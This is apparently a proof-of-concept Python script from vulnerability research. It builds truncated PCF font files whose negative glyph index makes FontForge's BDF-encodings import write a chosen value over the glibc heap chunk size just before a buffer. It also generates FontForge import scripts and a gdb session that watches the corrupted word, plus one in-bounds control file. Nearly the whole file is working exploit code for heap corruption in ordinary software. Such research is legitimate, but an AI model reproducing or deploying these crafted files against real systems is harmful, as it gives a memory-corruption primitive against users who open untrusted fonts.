#!/usr/bin/env python3
"""Craft PCFs whose single negative glyph index writes the LOW half of encs' chunk size.

Layout of the pinned BDF_ENCODINGS table in truncated.pcf (verified by xxd):
  0x114 format(4)=0, 0x118 min2, 0x11a max2, 0x11c min1, 0x11e max1,
  0x120 default(2), 0x122 first glyph index.

Pinned expression at fvimportbdf.c:1751:
  encs[glyph] = (i/(max2-min2+1) + min2)*256 + (i%(max2-min2+1) + min1);
With min2=max2=0, min1=max1=S and a single iteration i=0 the RHS is exactly
S. Ending the file one byte into the first index (low byte b) gives
glyph = b-256; b=0xfe gives glyph=-2, i.e. encs[-2] == encs-8, the low four
bytes of the 64-bit glibc chunk size word. No later iteration exists because
tot=(max2-min2+1)*(max1-min1+1)=1, so the high half is not overwritten.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())


def case(name, min1, low_byte=None, full_index=None):
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, 0, 0, min1, min1)
    if low_byte is not None:
        data[0x122] = low_byte
        data = data[:0x123]
    else:
        data[0x122:0x123] = struct.pack("<H", full_index)
    out = HERE / name
    out.write_bytes(data)
    print(f"{name}: {len(data)} bytes min1=min2..= {min1:#x} "
          f"index={low_byte:#04x}" if low_byte is not None else
          f"{name}: {len(data)} bytes min1={min1:#x} index={full_index:#x}")

for _name in ("size-91", "size-ff", "size-zero", "size-complete"):
    (HERE / f"import-{_name}.ff").write_text(
        "New()\n"
        f'Import("{HERE / (_name + ".pcf")}")\n'
    )

(HERE / "gdb-size-91.cmd").write_text(
    "set pagination off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-size-91.ff\n"
    'printf "HIT glyph=%d i=%d encs=%p\\n", glyph, i, encs\n'
    "x/2gx encs-16\n"
    "watch *(long*)((char*)encs-8)\n"
    "continue\n"
    "x/2gx encs-16\n"
    "bt 3\n"
    "continue\n"
    "quit\n"
)


case("size-91.pcf", 0x0091, low_byte=0xFE)   # glyph=-2, write 0x91 at encs-8
case("size-ff.pcf", 0x0091, low_byte=0xFF)   # glyph=-1, write 0x91 at encs-4 (high half)
case("size-zero.pcf", 0x0000, low_byte=0xFE) # glyph=-2, write 0 at encs-8
case("size-complete.pcf", 0x0091, full_index=0x0001)  # in-bounds control
